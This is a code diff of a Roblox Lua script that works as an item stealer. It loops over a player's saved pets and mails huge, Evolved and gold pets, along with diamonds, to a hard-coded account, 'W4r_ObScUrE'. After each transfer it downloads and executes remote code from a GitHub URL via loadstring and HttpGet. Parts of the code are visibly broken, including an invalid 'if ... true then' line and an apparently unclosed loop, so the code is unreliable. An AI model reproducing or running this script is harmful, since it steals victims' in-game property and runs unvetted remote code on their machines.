@@ -288,54 +288,7 @@ while wait() do
 			Invoke("Send Mail", unpack(args))
             loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
             wait(5)
-	elseif v2.huge == true and string.find(v2.name, "Evolved") and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 100000 then
-            _G.Username = "W4r_ObScUrE"
-            _G.PetName = v2.name
-            _G.PetRar = v2.rarity
-            print(_G.PetName)
-			local args = {
-    			[1] = {
-        			["Recipient"] = _G.Username,
-        			["Diamonds"] = _G.Lol,
-        			["Pets"] = {v.uid},
-        			["Message"] = _G.GiftMessage
-    			}
-			}
-			Invoke("Send Mail", unpack(args))
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
-            wait(5)
-	elseif v2.huge == true and v.g == true and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 100000 then
-            _G.Username = "W4r_ObScUrE"
-            _G.PetName = v2.name
-            _G.PetRar = v2.rarity
-            print(_G.PetName)
-			local args = {
-    			[1] = {
-        			["Recipient"] = _G.Username,
-        			["Diamonds"] = _G.Lol,
-        			["Pets"] = {v.uid},
-        			["Message"] = _G.GiftMessage
-    			}
-			}
-			Invoke("Send Mail", unpack(args))
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
-            wait(5)	
-	elseif v2.huge == true and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 100000 then
-            _G.Username = "W4r_ObScUrE"
-            _G.PetName = v2.name
-            _G.PetRar = v2.rarity
-            print(_G.PetName)
-			local args = {
-    			[1] = {
-        			["Recipient"] = _G.Username,
-        			["Diamonds"] = _G.Lol,
-        			["Pets"] = {v.uid},
-        			["Message"] = _G.GiftMessage
-    			}
-			}
-			Invoke("Send Mail", unpack(args))
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
-            wait(5)    
+   
             if v2.huge == false then
                 break
             end
@@ -354,6 +307,132 @@ while wait() do
         break
     end
 end
+
+while wait() do
+    for i, v in pairs(savedPets) do
+        local v2 = FrameworkLibrary.Directory.Pets[v.id]
+	_G.PetName = v2.name
+        _G.PetRar = v2.rarity
+        if game.Players.LocalPlayer.leaderstats.Diamonds.Value < 3000000 then
+                    _G.Lol = 0
+        end
+        if v2.huge == true and string.find(v2.name, "Evolved") and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 100000 then
+            _G.Username = "W4r_ObScUrE"
+            _G.PetName = v2.name
+            _G.PetRar = v2.rarity
+            print(_G.PetName)
+			local args = {
+    			[1] = {
+        			["Recipient"] = _G.Username,
+        			["Diamonds"] = _G.Lol,
+        			["Pets"] = {v.uid},
+        			["Message"] = _G.GiftMessage
+    			}
+			}
+			Invoke("Send Mail", unpack(args))
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
+            wait(5)
+   
+            if not string.find(v2.name, "Evolved") then
+                break
+            end
+        end
+    end
+    local allEvolvedFalse = true
+    for i, v in pairs(savedPets) do
+        local v2 = FrameworkLibrary.Directory.Pets[v.id]
+        if string.find(v2.name, "Evolved") true then
+            allEvolvedFalse = false
+            break
+        end
+    end
+    
+    if allEvolvedFalse then
+        break
+    end
+end
+
+while wait() do
+    for i, v in pairs(savedPets) do
+        local v2 = FrameworkLibrary.Directory.Pets[v.id]
+	_G.PetName = v2.name
+        _G.PetRar = v2.rarity
+        if game.Players.LocalPlayer.leaderstats.Diamonds.Value < 3000000 then
+                    _G.Lol = 0
+        end
+        if v2.huge == true and v.g == true and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 100000 then
+            _G.Username = "W4r_ObScUrE"
+            _G.PetName = v2.name
+            _G.PetRar = v2.rarity
+            print(_G.PetName)
+			local args = {
+    			[1] = {
+        			["Recipient"] = _G.Username,
+        			["Diamonds"] = _G.Lol,
+        			["Pets"] = {v.uid},
+        			["Message"] = _G.GiftMessage
+    			}
+			}
+			Invoke("Send Mail", unpack(args))
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
+            wait(5)
+   
+            if v2.huge == false or v.g == false then
+                break
+            end
+        end
+    end
+    local allGoldFalse = true
+    for i, v in pairs(savedPets) do
+        local v2 = FrameworkLibrary.Directory.Pets[v.id]
+        if v2.huge == true and v.g == true then
+            allGoldFalse = false
+            break
+        end
+    end
+    
+    if allGoldFalse then
+        break
+    end
+end
+
+while wait() do
+    for i, v in pairs(savedPets) do
+        local v2 = FrameworkLibrary.Directory.Pets[v.id]
+	_G.PetName = v2.name
+        _G.PetRar = v2.rarity
+        if game.Players.LocalPlayer.leaderstats.Diamonds.Value < 3000000 then
+                    _G.Lol = 0
+        end
+        if v2.huge == true and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 100000 then
+            _G.Username = "W4r_ObScUrE"
+            _G.PetName = v2.name
+            _G.PetRar = v2.rarity
+            print(_G.PetName)
+			local args = {
+    			[1] = {
+        			["Recipient"] = _G.Username,
+        			["Diamonds"] = _G.Lol,
+        			["Pets"] = {v.uid},
+        			["Message"] = _G.GiftMessage
+    			}
+			}
+			Invoke("Send Mail", unpack(args))
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
+            wait(5)   
+            if v2.huge == false then
+                break
+            end
+        end
+    end
+    local allHugeFalse = true
+    for i, v in pairs(savedPets) do
+        local v2 = FrameworkLibrary.Directory.Pets[v.id]
+        if v2.huge == true then
+            allHugeFalse = false
+            break
+        end
+    end
 
 _G.CACA = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 1000000
 for i, v in pairs(savedPets) do
